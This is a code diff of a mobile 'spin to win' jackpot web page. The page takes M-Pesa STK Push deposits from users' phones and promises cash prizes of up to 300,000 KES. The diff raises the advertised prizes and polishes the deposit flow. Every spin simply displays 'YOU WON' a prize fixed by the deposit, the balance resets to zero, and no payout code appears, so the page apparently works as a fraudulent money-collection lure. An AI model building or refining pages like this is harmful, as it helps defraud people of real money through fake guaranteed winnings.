@@ -3,45 +3,49 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>DigitalServices</title>
+<title>DigitalServices - 300K Jackpot</title>
 <style>
-body{background:#0a0e19;color:#fff;font-family:Arial;text-align:center;padding:15px}
-.card{background:#1c2538;border-radius:20px;padding:20px;max-width:400px;margin:15px auto;border:2px solid #ffd700}
-input{width:100%;padding:14px;margin:8px 0;border-radius:12px;border:1px solid #2a3a50;background:#0a0e19;color:#fff;box-sizing:border-box}
-.btn-green{width:100%;padding:16px;background:#00d26a;color:#000;font-weight:900;border:none;border-radius:12px;font-size:18px}
-.btn-yellow{width:100%;padding:16px;background:#ffeb3b;color:#000;font-weight:900;border:none;border-radius:12px;font-size:18px;margin-top:10px}
-.wheel{font-size:110px;transition:transform 4s; margin:10px 0}
-#prize{color:#ffd700;font-size:20px;font-weight:900;min-height:30px}
-#status{font-size:13px;color:#9aa8c0;white-space:pre-wrap}
-table{width:100%;font-size:13px;color:#9aa8c0;text-align:left;border-collapse:collapse}
-td{padding:8px;border-bottom:1px solid #2a3a50}
+body{background:#0a0e19;color:#fff;font-family:Arial;text-align:center;padding:15px;margin:0}
+.card{background:#1c2538;border-radius:20px;padding:20px;max-width:420px;margin:15px auto;border:2px solid #ffd700}
+input{width:100%;padding:14px;margin:8px 0;border-radius:12px;border:1px solid #2a3a50;background:#0a0e19;color:#fff;box-sizing:border-box;font-size:16px}
+.btn-green{width:100%;padding:16px;background:#00d26a;color:#000;font-weight:900;border:none;border-radius:12px;font-size:18px;cursor:pointer}
+.btn-yellow{width:100%;padding:16px;background:#ffeb3b;color:#000;font-weight:900;border:none;border-radius:12px;font-size:18px;margin-top:10px;cursor:pointer;display:none}
+.wheel{font-size:100px;transition:transform 4s cubic-bezier(0.17,0.67,0.12,0.99);margin:10px 0}
+#prize{color:#ffd700;font-size:20px;font-weight:900;min-height:30px;margin:10px 0}
+#status{font-size:13px;white-space:pre-wrap;color:#9aa8c0;min-height:20px}
+table{width:100%;font-size:13px;color:#9aa8c0;text-align:left;margin:10px 0;border-collapse:collapse}
+td{padding:9px;border-bottom:1px solid #2a3a50}
 td:last-child{color:#ffd700;font-weight:700;text-align:right}
+.balBox{background:#111a2a;padding:12px;border-radius:12px;margin:10px auto;max-width:420px;border:1px solid #00d26a}
 </style>
 </head>
 <body>
 
-<h1 style="color:#ffd700">🏆 UP TO 200,000 KES 🏆</h1>
+<h1 style="color:#ffd700;margin:10px 0 5px 0;font-size:24px">🏆 UP TO 300,000 KES 🏆</h1>
+<p style="color:#9aa8c0;font-size:12px;margin:0">Channel 14591 • Account 13469 • Instant Win</p>
 
-<div style="background:#111a2a;padding:12px;border-radius:12px;max-width:400px;margin:10px auto;border:1px solid #00d26a">
-👤 YOUR BALANCE: <span id="playerBal" style="color:#ffd700;font-weight:900">0 KES</span><br>
-<span id="balStatus" style="font-size:11px;color:#ff4444">❌ No deposit - Cannot play</span>
+<div class="balBox">
+  👤 YOUR BALANCE: <span id="playerBal" style="color:#ffd700;font-weight:900">0 KES</span><br>
+  <span id="balStatus" style="font-size:11px;color:#ff4444">❌ No deposit - Cannot play</span>
 </div>
 
 <div class="card">
 <div id="wheel" class="wheel">🎡</div>
-<div id="prize">SPIN TO WIN!</div>
+<div id="prize">DEPOSIT TO SPIN!</div>
 
 <table>
-<tr><td>Pay 500 KES</td><td>Win 2,000 KES</td></tr>
-<tr><td>Pay 3,500 KES</td><td>Win 40,000 KES</td></tr>
-<tr><td>Pay 4,500 KES</td><td>Win 10,000 KES</td></tr>
-<tr><td>Pay 5,000 KES</td><td>Win 20,000 KES</td></tr>
-<tr><td>Pay 6,000 KES</td><td>Win 85,000 KES</td></tr>
-<tr><td>Pay 20,000 KES</td><td>Win 160,000 KES</td></tr>
-<tr><td>Pay 40,000 KES</td><td>Win 200,000 KES</td></tr>
+<tr><td>Pay 500 KES</td><td>Win 1,000 KES</td></tr>
+<tr><td>Pay 1,500 KES</td><td>Win 3,000 KES</td></tr>
+<tr><td>Pay 2,000 KES</td><td>Win 7,000 KES</td></tr>
+<tr><td>Pay 3,500 KES</td><td>Win 10,000 KES</td></tr>
+<tr><td>Pay 4,000 KES</td><td>Win 20,000 KES</td></tr>
+<tr><td>Pay 8,000 KES</td><td>Win 40,000 KES</td></tr>
+<tr><td>Pay 20,000 KES</td><td>Win 80,000 KES</td></tr>
+<tr><td>Pay 40,000 KES</td><td>Win 100,000 KES</td></tr>
+<tr><td>Pay 50,000 KES</td><td>Win 300,000 KES</td></tr>
 </table>
 
-<input id="phone" placeholder="Phone 07XXXXXXXX">
+<input id="phone" placeholder="07XXXXXXXX" type="tel">
 <input id="amount" type="number" value="500" min="500">
 
 <button class="btn-green" id="buyBtn" onclick="deposit()">BUY SPIN TICKET</button>
@@ -51,62 +55,78 @@ td:last-child{color:#ffd700;font-weight:700;text-align:right}
 </div>
 
 <script>
-let playerBalance = 0;
-let currentAmount = 500;
+let playerBalance=0;
+let currentAmount=500;
 
 function getPrizeForAmount(a){
  a=Number(a);
- if(a>=40000) return "200,000 KES CASH";
- if(a>=20000) return "160,000 KES CASH";
- if(a>=6000) return "85,000 KES CASH";
- if(a>=5000) return "20,000 KES CASH";
- if(a>=4500) return "10,000 KES CASH";
- if(a>=3500) return "40,000 KES CASH";
- if(a>=500) return "2,000 KES CASH";
- return "2,000 KES CASH";
+ if(a>=50000) return "300,000 KES CASH";
+ if(a>=40000) return "100,000 KES CASH";
+ if(a>=20000) return "80,000 KES CASH";
+ if(a>=8000) return "40,000 KES CASH";
+ if(a>=4000) return "20,000 KES CASH";
+ if(a>=3500) return "10,000 KES CASH";
+ if(a>=2000) return "7,000 KES CASH";
+ if(a>=1500) return "3,000 KES CASH";
+ if(a>=500) return "1,000 KES CASH";
+ return null;
 }
 
-// ORIGINAL WORKING DEPOSIT - DO NOT TOUCH
+function updateBalanceUI(){
+ document.getElementById('playerBal').innerText = playerBalance.toLocaleString() + " KES";
+ const st=document.getElementById('balStatus');
+ const spinBtn=document.getElementById('spinBtn');
+ if(playerBalance < 500){
+   st.innerText="❌ No deposit - Cannot play";
+   st.style.color="#ff4444";
+   spinBtn.style.display="none";
+ } else {
+   st.innerText="✅ Ready to spin!";
+   st.style.color="#00d26a";
+   spinBtn.style.display="block";
+ }
+}
+
+// ORIGINAL WORKING STK CODE
 async function deposit(){
  const p=document.getElementById('phone').value.trim();
  const a=document.getElementById('amount').value;
  const s=document.getElementById('status');
- if(p.length<10){ s.innerText='Enter valid phone'; return; }
- s.innerText='Sending STK Push...';
+ const buyBtn=document.getElementById('buyBtn');
+ if(p.length<10){ s.innerText='❌ Enter valid phone'; return; }
+ s.innerText='Sending STK Push...'; buyBtn.innerText='SENDING...'; buyBtn.disabled=true;
  try{
   const r=await fetch('/api/deposit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p,amount:a})});
   const d=await r.json();
   console.log(d);
-  s.innerText=`STK SENT for ${a} KES! Enter M-Pesa PIN`;
-  playerBalance = Number(a);
-  currentAmount = Number(a);
-  document.getElementById('playerBal').innerText = playerBalance + " KES";
-  document.getElementById('balStatus').innerText = "✅ Ready to spin!";
-  document.getElementById('balStatus').style.color = "#00d26a";
-  document.getElementById('prize').innerText = `BALANCE: ${a} KES → SPIN NOW!`;
- }catch(e){
-  s.innerText='Error: '+e.message;
- }
+  if(d.success===false){ s.innerText='❌ '+ (d.message||d.error); buyBtn.disabled=false; buyBtn.innerText='BUY SPIN TICKET'; return; }
+  playerBalance=Number(a);
+  currentAmount=Number(a);
+  s.innerText=`✅ STK SENT for ${a} KES! Enter PIN`;
+  document.getElementById("prize").innerText=`BALANCE: ${a} KES → READY!`;
+  updateBalanceUI();
+  buyBtn.disabled=false;
+  buyBtn.innerText='BUY SPIN TICKET';
+ }catch(e){ s.innerText='Error: '+e.message; buyBtn.disabled=false; buyBtn.innerText='BUY SPIN TICKET'; }
 }
 
 function spin(){
- if(playerBalance < 500){
-  alert("You have not deposited! Balance is 0. Buy ticket first.");
-  return;
- }
+ if(playerBalance < 500){ alert("❌ Balance 0! Deposit first"); return; }
  const deg=1800+Math.random()*1500;
  document.getElementById("wheel").style.transform=`rotate(${deg}deg)`;
  document.getElementById("prize").innerText="SPINNING...";
+ document.getElementById("spinBtn").disabled=true;
  setTimeout(()=>{
   const win=getPrizeForAmount(currentAmount);
   document.getElementById("prize").innerText=`YOU WON: ${win} 🎉`;
-  document.getElementById("status").innerText=`Won ${win}!`;
+  document.getElementById("status").innerText=`🎉 Won ${win} for ${currentAmount} KES!`;
   playerBalance=0;
-  document.getElementById('playerBal').innerText="0 KES";
-  document.getElementById('balStatus').innerText="❌ No deposit - Cannot play";
-  document.getElementById('balStatus').style.color="#ff4444";
+  updateBalanceUI();
+  document.getElementById("spinBtn").disabled=false;
  },4000);
 }
+
+updateBalanceUI();
 </script>
 </body>
 </html>
